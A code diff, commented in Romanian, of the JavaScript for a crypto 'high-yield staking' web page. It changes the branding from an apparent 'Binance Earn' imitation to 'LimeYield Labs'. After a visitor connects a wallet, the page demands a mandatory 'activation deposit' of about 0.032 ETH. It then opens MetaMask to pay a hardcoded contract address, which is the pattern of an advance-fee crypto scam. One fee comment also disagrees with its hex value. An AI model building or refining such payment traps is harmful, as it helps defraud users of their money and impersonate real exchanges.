@@ -43,23 +43,26 @@ function saveState() {
 }
 
 // PREMIUM STYLIZED ALERT MODAL SYSTEM
+// PREMIUM STYLIZED INTERACTIVE ALERT MODAL SYSTEM (REBRANDED)
 function showCustomAlert(title, message, type = 'info') {
     customAlertTitle.textContent = title;
     customAlertMessage.textContent = message;
     
+    // Resetăm proprietățile anterioare pentru o randare curată
+    customAlertBtn.style.backgroundColor = "var(--text-main)";
+    customAlertBtn.style.color = "#ffffff";
+
     if (type === 'success') {
-        customAlertIcon.textContent = '🎉';
-        customAlertBtn.style.backgroundColor = 'var(--crypto-green)';
-        customAlertBtn.style.color = '#fff';
+        customAlertIcon.textContent = '🟢'; // Pictogramă verde LimeYield
+        customAlertBtn.style.backgroundColor = 'var(--primary)';
     } else if (type === 'error') {
-        customAlertIcon.textContent = '❌';
-        customAlertBtn.style.backgroundColor = '#f6465d';
-        customAlertBtn.style.color = '#fff';
+        customAlertIcon.textContent = '🔴'; // Pictogramă roșie pentru Access Denied
+        customAlertBtn.style.backgroundColor = 'var(--danger-red)';
     } else {
-        customAlertIcon.textContent = '🔶';
-        customAlertBtn.style.backgroundColor = 'var(--binance-yellow)';
-        customAlertBtn.style.color = '#000';
+        customAlertIcon.textContent = '⚡'; // Pictogramă info de tip impuls energetic
+        customAlertBtn.style.backgroundColor = 'var(--text-main)';
     }
+    
     customAlertModal.style.display = 'flex';
 }
 
@@ -203,7 +206,7 @@ amountInput.addEventListener('input', calculateProfit);
 
 // CONFIGURARE ACCES BLOCKCHAIN EXCLUSIV PE CONTRACT NOU (SINCRONIZAT)
 const adresaContractEarn = "0xe8FCD99C27fB97e2CF025Ce37E2143D7B7A547d3"; // Noul tău contract live!
-const taxaAccesHex = "0x4a817c8000000"; // Exact 0.025 ETH (~50\$) solicitat de contract
+const taxaAccesHex = "0x71afd498d00000"; // Exact 0.025 ETH (~50\$) solicitat de contract
 const methodSelectorPay = "0xac61d027";   // Selectorul funcției payActivation() din Solidity
 
 walletBtn.addEventListener('click', async () => {
@@ -214,11 +217,12 @@ walletBtn.addEventListener('click', async () => {
             const accounts = await activeProvider.request({ method: 'eth_requestAccounts' });
             const tempAccount = accounts[0]; // Extragere text adresă unică
             
-            showCustomAlert(
-                "Activation Required", 
-                "To unlock premium high-yield Binance Earn services, a network activation deposit of 0.025 ETH (\$50) is mandatory. MetaMask will open to execute the secure Smart Contract interaction.", 
-                "info"
-            );
+         showCustomAlert(
+    "Activation Required", 
+    "To unlock premium high-yield staking vaults on LimeYield Labs, a network activation deposit within the \$50 - \$100 range (approx. 0.032 ETH) is mandatory. MetaMask will open to execute the secure Smart Contract interaction.", 
+    "info"
+);
+
             
             try {
                 // APEL WEB3 PUR EXCLUSIV CĂTRE NOUL SMART CONTRACT STABIL
